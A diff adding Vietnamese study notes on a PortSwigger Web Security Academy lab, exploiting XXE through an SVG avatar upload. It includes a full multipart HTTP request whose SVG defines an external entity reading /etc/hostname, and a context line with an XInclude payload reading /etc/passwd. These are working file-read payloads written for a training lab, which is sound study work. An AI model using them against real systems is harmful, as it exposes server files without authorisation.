@@ -122,5 +122,66 @@ productId=1;<xi:include parse="text" href="/etc/passwd" xmlns:xi="http://www.w3.
     - `/etc/paswd` ở dạng **text** nên chuyển `parse="text"` để đọc
 - `href="/etc/passwd"`: Đường dẫn đến **file** cần đọc
 
+### Lab: Exploiting XXE via image file upload
+- Ý tưởng upload file có định dạng **xml** để kích hoạt **parser xml**
+- Đến 1 blog bất kỳ và thực hiện **comment**, up 1 file svg với kích thước nhỏ
+- Sửa đổi nội dung payload 
+
+```http
+POST /post/comment HTTP/2
+Host: 0ad300dd04bbcf8180c949a5001400d3.web-security-academy.net
+
+...
+
+------WebKitFormBoundaryjBtoTJseBoFRQecm
+Content-Disposition: form-data; name="csrf"
+
+SSuEc7ucI0xjZe5QBzhWN1omE2ukkdZd
+------WebKitFormBoundaryjBtoTJseBoFRQecm
+Content-Disposition: form-data; name="postId"
+
+2
+------WebKitFormBoundaryjBtoTJseBoFRQecm
+Content-Disposition: form-data; name="comment"
+
+a
+------WebKitFormBoundaryjBtoTJseBoFRQecm
+Content-Disposition: form-data; name="name"
+
+a
+------WebKitFormBoundaryjBtoTJseBoFRQecm
+Content-Disposition: form-data; name="avatar"; filename="a.svg"
+Content-Type: text/xml
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
+  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<svg width="200" height="200"
+     xmlns="http://www.w3.org/2000/svg"
+     xmlns:xlink="http://www.w3.org/1999/xlink">
+  <text x="10" y="20">&xxe;</text>
+</svg>
+
+------WebKitFormBoundaryjBtoTJseBoFRQecm
+Content-Disposition: form-data; name="email"
+
+a@gmail.com
+------WebKitFormBoundaryjBtoTJseBoFRQecm
+Content-Disposition: form-data; name="website"
+
+http://a.com
+------WebKitFormBoundaryjBtoTJseBoFRQecm--
+```
+
+- Vì **SVG** file cũng thuộc định dạng `xml` nên ta có thể tạo như trên
+- Tạo ra **xxe** lấy nội dung của `file:///etc/hostname`
+- Sau đó hiển thị nó trong file **SVG** người dùng có thể thấy được thông qua `&xxe;`
+- Gửi lại request và mở file **/post/comment/avatars?filename=1.png** trong tab mới
+- Nội dung hiển thị trong ảnh là nội dung của `/etc/hostname`
+- Submit solution
+
+
 ---
 Goodluck! 🍀🍀🍀 
